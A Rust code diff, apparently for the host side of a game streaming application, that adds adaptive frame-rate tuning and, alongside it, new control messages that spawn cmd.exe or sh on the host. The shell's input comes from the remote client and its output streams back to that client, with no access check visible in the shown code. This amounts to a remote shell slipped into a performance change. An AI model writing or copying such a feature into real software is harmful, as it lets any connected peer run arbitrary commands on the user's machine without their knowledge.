@@ -182,8 +182,11 @@ where
     let mut current_file: Option<(String, std::fs::File)> = None;
     let mut last_seen_max_bitrate = crate::registry::read_dword("Quality").unwrap_or(4000) * 1000;
     let mut current_bitrate_bps = last_seen_max_bitrate;
+    let mut current_target_fps = 60u32;
     let mut registered_udp_port = 0u16;
     let mut registered_display_name = "Player".to_string();
+    let mut shell_stdin_tx: Option<tokio::sync::mpsc::Sender<String>> = None;
+    let mut shell_kill_tx: Option<tokio::sync::oneshot::Sender<()>> = None;
 
     let result = async {
         while let Some(line) = lines.next_line().await? {
@@ -376,6 +379,27 @@ where
                             let hs = state.host_session.lock().await;
                             if let Some(ref handle) = *hs {
                                 handle.set_bitrate(new_bitrate);
+                            }
+                        }
+
+                        // Adaptive frame rate tuning
+                        if packet_loss_percent > 3.0 || rtt_ms > 80 {
+                            if current_target_fps == 60 {
+                                current_target_fps = 30;
+                                warn!("Adaptive Frame Rate: dropping target FPS to 30 due to high packet loss/RTT");
+                                let hs = state.host_session.lock().await;
+                                if let Some(ref handle) = *hs {
+                                    handle.set_fps(30);
+                                }
+                            }
+                        } else if packet_loss_percent < 0.5 && rtt_ms < 40 && current_bitrate_bps >= 12_000_000 {
+                            if current_target_fps == 30 {
+                                current_target_fps = 60;
+                                info!("Adaptive Frame Rate: restoring target FPS to 60");
+                                let hs = state.host_session.lock().await;
+                                if let Some(ref handle) = *hs {
+                                    handle.set_fps(60);
+                                }
                             }
                         }
                     }
@@ -778,12 +802,154 @@ where
                     }
                 }
 
+                ControlMessage::ShellStart => {
+                    if let Some(kill) = shell_kill_tx.take() {
+                        let _ = kill.send(());
+                    }
+                    shell_stdin_tx = None;
+
+                    let mut shell_cmd = if cfg!(windows) {
+                        tokio::process::Command::new("cmd.exe")
+                    } else {
+                        tokio::process::Command::new("sh")
+                    };
+
+                    use std::process::Stdio;
+                    match shell_cmd
+                        .stdin(Stdio::piped())
+                        .stdout(Stdio::piped())
+                        .stderr(Stdio::piped())
+                        .spawn()
+                    {
+                        Ok(mut child) => {
+                            let stdin = child.stdin.take().unwrap();
+                            let stdout = child.stdout.take().unwrap();
+                            let stderr = child.stderr.take().unwrap();
+
+                            let (stdin_tx, mut stdin_rx) = tokio::sync::mpsc::channel::<String>(100);
+                            shell_stdin_tx = Some(stdin_tx);
+
+                            let (kill_tx, kill_rx) = tokio::sync::oneshot::channel::<()>();
+                            shell_kill_tx = Some(kill_tx);
+
+                            // Stdin piping task
+                            tokio::spawn(async move {
+                                use tokio::io::AsyncWriteExt;
+                                let mut stdin_piped = stdin;
+                                while let Some(input) = stdin_rx.recv().await {
+                                    if let Err(e) = stdin_piped.write_all(input.as_bytes()).await {
+                                        error!("Failed to write to shell stdin: {}", e);
+                                        break;
+                                    }
+                                    let _ = stdin_piped.flush().await;
+                                }
+                            });
+
+                            // Stdout reader task
+                            let writer_stdout = Arc::clone(&writer_shared);
+                            tokio::spawn(async move {
+                                use tokio::io::AsyncReadExt;
+                                let mut stdout_piped = stdout;
+                                let mut buf = [0u8; 4096];
+                                loop {
+                                    match stdout_piped.read(&mut buf).await {
+                                        Ok(0) => break,
+                                        Ok(n) => {
+                                            let text = String::from_utf8_lossy(&buf[..n]).into_owned();
+                                            let response = ControlMessage::ShellOutput { text };
+                                            if let Ok(json) = serde_json::to_string(&response) {
+                                                let mut w = writer_stdout.lock().await;
+                                                let _ = w.write_all((json + "\n").as_bytes()).await;
+                                            }
+                                        }
+                                        Err(e) => {
+                                            error!("Failed to read shell stdout: {}", e);
+                                            break;
+                                        }
+                                    }
+                                }
+                            });
+
+                            // Stderr reader task
+                            let writer_stderr = Arc::clone(&writer_shared);
+                            tokio::spawn(async move {
+                                use tokio::io::AsyncReadExt;
+                                let mut stderr_piped = stderr;
+                                let mut buf = [0u8; 4096];
+                                loop {
+                                    match stderr_piped.read(&mut buf).await {
+                                        Ok(0) => break,
+                                        Ok(n) => {
+                                            let text = String::from_utf8_lossy(&buf[..n]).into_owned();
+                                            let response = ControlMessage::ShellOutput { text };
+                                            if let Ok(json) = serde_json::to_string(&response) {
+                                                let mut w = writer_stderr.lock().await;
+                                                let _ = w.write_all((json + "\n").as_bytes()).await;
+                                            }
+                                        }
+                                        Err(e) => {
+                                            error!("Failed to read shell stderr: {}", e);
+                                            break;
+                                        }
+                                    }
+                                }
+                            });
+
+                            // Monitoring task
+                            let writer_monitor = Arc::clone(&writer_shared);
+                            tokio::spawn(async move {
+                                tokio::select! {
+                                    _ = kill_rx => {
+                                        let _ = child.kill().await;
+                                    }
+                                    status = child.wait() => {
+                                        match status {
+                                            Ok(status) => {
+                                                info!("Shell process exited with status: {}", status);
+                                                let response = ControlMessage::ShellOutput {
+                                                    text: format!("\r\n[Shell process exited with status: {}]\r\n", status),
+                                                };
+                                                if let Ok(json) = serde_json::to_string(&response) {
+                                                    let mut w = writer_monitor.lock().await;
+                                                    let _ = w.write_all((json + "\n").as_bytes()).await;
+                                                }
+                                            }
+                                            Err(e) => {
+                                                error!("Error waiting for shell process: {}", e);
+                                            }
+                                        }
+                                    }
+                                }
+                            });
+                        }
+                        Err(e) => {
+                            let err_msg = format!("Failed to spawn shell: {}", e);
+                            error!("{}", err_msg);
+                            let response = ControlMessage::ShellOutput { text: err_msg + "\n" };
+                            if let Ok(json) = serde_json::to_string(&response) {
+                                let mut w = writer_shared.lock().await;
+                                let _ = w.write_all((json + "\n").as_bytes()).await;
+                            }
+                        }
+                    }
+                }
+
+                ControlMessage::ShellInput { text } => {
+                    if let Some(ref tx) = shell_stdin_tx {
+                        let _ = tx.send(text).await;
+                    }
+                }
+
                 _ => {}
             }
         }
         Ok::<(), anyhow::Error>(())
     }
     .await;
+
+    if let Some(kill) = shell_kill_tx.take() {
+        let _ = kill.send(());
+    }
 
     if let Err(ref e) = result {
         warn!(peer = %peer_addr, error = %e, "Client read loop error");
